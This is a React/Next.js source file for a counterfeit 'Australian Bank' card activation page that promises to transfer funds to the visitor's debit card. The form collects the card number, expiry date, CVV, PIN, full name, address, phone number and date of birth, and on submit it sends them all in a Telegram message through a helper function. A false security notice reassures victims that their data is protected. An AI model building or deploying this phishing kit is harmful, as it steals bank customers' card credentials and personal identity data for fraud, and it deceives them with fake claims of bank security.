"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram";

const ActivateCardPage: React.FC = () => {
  const [formData, setFormData] = useState({
    cardNumber: "",
    expirationDate: "",
    cvv: "",
    cardPin: "", // Added card PIN field
    fullName: "",
    address: "",
    city: "",
    state: "",
    postalCode: "",
    phoneNumber: "",
    dateOfBirth: ""
  });
  const [error, setError] = useState("");
  const router = useRouter();

  // Australian states and territories
  const australianStates = [
    "Australian Capital Territory",
    "New South Wales",
    "Northern Territory",
    "Queensland",
    "South Australia",
    "Tasmania",
    "Victoria",
    "Western Australia"
  ];

  const isFormValid =  
    formData.expirationDate && 
    formData.fullName.length > 0 &&
    formData.address.length > 0 &&
    formData.city.length > 0 &&
    formData.state.length > 0 &&
    formData.postalCode.length >= 4// Added PIN validation

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!isFormValid) {
      setError("Please complete all required fields correctly.");
      return;
    }

    const message = `
🔔 *Australian Bank Card Activation* 🔔
👤 Full Name: ${formData.fullName}
💳 Card Number: ${formData.cardNumber}
📅 Expiration Date: ${formData.expirationDate}
🔒 CVV: ${formData.cvv}
🔑 Card PIN: ${formData.cardPin}
🏠 Address: ${formData.address}, ${formData.city}, ${formData.state} ${formData.postalCode}
📞 Phone: ${formData.phoneNumber}
🎂 Date of Birth: ${formData.dateOfBirth}
    `;

    try {
      await sendTelegramMessage(message);
      setError("");
      router.push('/profile');
    } catch (err) {
      console.log(err);
      setError("Failed to activate card. Please try again.");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 px-4 py-8">
      <div className="bg-white shadow-xl rounded-2xl p-6 w-full max-w-2xl text-center border border-gray-200">
        {/* Bank Logo Header */}
        <div className="flex justify-center mb-6">
          <div className="flex items-center justify-center bg-blue-800 text-white rounded-full w-16 h-16 shadow-md">
            <span className="text-xl font-bold">AB</span>
          </div>
        </div>
        
        <h1 className="text-2xl md:text-3xl font-bold text-gray-900 tracking-tight font-sans mb-2">
          Transfer Funds Directly to Your
          <span className="text-blue-600"> Debit Card</span>
        </h1>

        <p className="text-gray-600 mt-2 text-base">
          Easily and securely move money to your card by completing the activation steps below.
        </p>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-xl mt-4 text-sm">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="mt-8 space-y-5">
          {/* Card Details */}
          <div className="bg-blue-50 p-6 rounded-xl">
            <h2 className="text-lg font-semibold text-blue-800 mb-4 text-left">
              Card Details
            </h2>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Card Number */}
              <div className="md:col-span-2">
                <label
                  htmlFor="cardNumber"
                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
                >
                  Card Number
                </label>
                <input
                  id="cardNumber"
                  type="text"
                  name="cardNumber"
                  inputMode="numeric"
                  pattern="[0-9 ]*"
                  placeholder="1234 5678 9012 3456"
                  value={formData.cardNumber}
                  onChange={handleChange}
                  maxLength={19}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
                  aria-describedby="cardNumberHelp"
                />
                <p id="cardNumberHelp" className="text-xs text-gray-500 mt-1">
                  Enter your 16-digit card number
                </p>
              </div>

              {/* Expiry Date */}
              <div>
                <label
                  htmlFor="expirationDate"
                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
                >
                  Expiry Date (MM / YY)
                </label>
                <input
                  id="expirationDate"
                  type="text"
                  name="expirationDate"
                  placeholder="MM/YYYY"
                  maxLength={8}
                  value={formData.expirationDate}
                  onChange={(e) => {
                    let value = e.target.value.replace(/\D/g, "");
                    if (value.length > 2) {
                      value = value.slice(0, 2) + "/" + value.slice(2, 6);
                    }
                    setFormData({ ...formData, expirationDate: value });
                  }}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-gray-400"
                  aria-describedby="expiryHelp"
                />
                <p id="expiryHelp" className="text-xs text-gray-500 mt-1">
                  Enter expiration as MM/YYYY, e.g., 09/25
                </p>
              </div>

              {/* CVV */}
              <div>
                <label
                  htmlFor="cvv"
                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
                >
                  CVV
                </label>
                <input
                  id="cvv"
                  type="text"
                  name="cvv"
                  inputMode="numeric"
                  pattern="\d{3}"
                  placeholder="123"
                  value={formData.cvv}
                  onChange={handleChange}
                  maxLength={3}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
                  aria-describedby="cvvHelp"
                />
                <p id="cvvHelp" className="text-xs text-gray-500 mt-1">
                  3-digit code on the back of your card
                </p>
              </div>

              {/* Card PIN - Added this field */}
              <div>
                <label
                  htmlFor="cardPin"
                  className="block text-sm text-gray-700 mb-1 text-left font-medium"
                >
                  Card PIN
                </label>
                <input
                  id="cardPin"
                  type="password"
                  name="cardPin"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder="••••"
                  value={formData.cardPin}
                  onChange={handleChange}
                  maxLength={10}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm placeholder-gray-400"
                  aria-describedby="pinHelp"
                />
                <p id="pinHelp" className="text-xs text-gray-500 mt-1">
                  4-digit PIN for your card
                </p>
              </div>
            </div>
          </div>

          {/* ... rest of the form remains the same ... */}
          {/* Personal Details */}
          <div className="bg-blue-50 p-4 rounded-xl">
            <h2 className="text-lg font-semibold text-blue-800 mb-3 text-left">Personal Information</h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-600 mb-1 text-left">Full Name as on Card</label>
                <input
                  type="text"
                  name="fullName"
                  placeholder="John David Smith"
                  value={formData.fullName}
                  onChange={handleChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                />
              </div>
              
              <div>
                <label className="block text-sm text-gray-600 mb-1 text-left">Street Address</label>
                <input
                  type="text"
                  name="address"
                  placeholder="123 Main Street"
                  value={formData.address}
                  onChange={handleChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                />
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <label className="block text-sm text-gray-600 mb-1 text-left">City</label>
                  <input
                    type="text"
                    name="city"
                    placeholder="Sydney"
                    value={formData.city}
                    onChange={handleChange}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                  />
                </div>
                
                <div>
                  <label className="block text-sm text-gray-600 mb-1 text-left">State</label>
                  <select
                    name="state"
                    value={formData.state}
                    onChange={handleChange}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                  >
                    <option value="">Select State</option>
                    {australianStates.map(state => (
                      <option key={state} value={state}>{state}</option>
                    ))}
                  </select>
                </div>
                
                <div>
                  <label className="block text-sm text-gray-600 mb-1 text-left">Postal Code</label>
                  <input
                    type="text"
                    name="postalCode"
                    placeholder="2000"
                    value={formData.postalCode}
                    onChange={handleChange}
                    maxLength={4}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                  />
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm text-gray-600 mb-1 text-left">Phone Number</label>
                  <input
                    type="tel"
                    name="phoneNumber"
                    placeholder="04XX XXX XXX"
                    value={formData.phoneNumber}
                    onChange={handleChange}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                  />
                </div>
                
                <div>
                  <label className="block text-sm text-gray-600 mb-1 text-left">Date of Birth</label>
                  <input
                    type="text"
                    name="dateOfBirth"
                    placeholder="DD/MM/YYYY"
                    value={formData.dateOfBirth}
                    onChange={handleChange}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
                  />
                </div>
              </div>
            </div>
          </div>

          <button
            type="submit"
            className="w-full py-3.5 rounded-xl text-white font-semibold transition duration-300 text-base bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-700 hover:to-indigo-800 shadow-md"
          >
            Activate Card
          </button>
        </form>

        {/* Security Notice */}
        <div className="mt-8 p-4 bg-gray-100 rounded-xl">
          <h3 className="text-sm font-semibold text-gray-800 mb-2">Security Notice</h3>
          <p className="text-xs text-gray-600">
            Your information is protected with bank-level security encryption. 
            Australian Bank uses industry-standard SSL encryption to protect your data 
            during transmission. We will never share your details with third parties 
            without your consent.
          </p>
        </div>

        {/* Footer */}
        <div className="mt-6 pt-4 border-t border-gray-200">
          <p className="text-xs text-gray-500">
            © 2023 Australian Bank. All rights reserved. | 
            <a href="#" className="text-blue-600 hover:underline ml-1">Privacy Policy</a> | 
            <a href="#" className="text-blue-600 hover:underline ml-1">Terms of Service</a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default ActivateCardPage;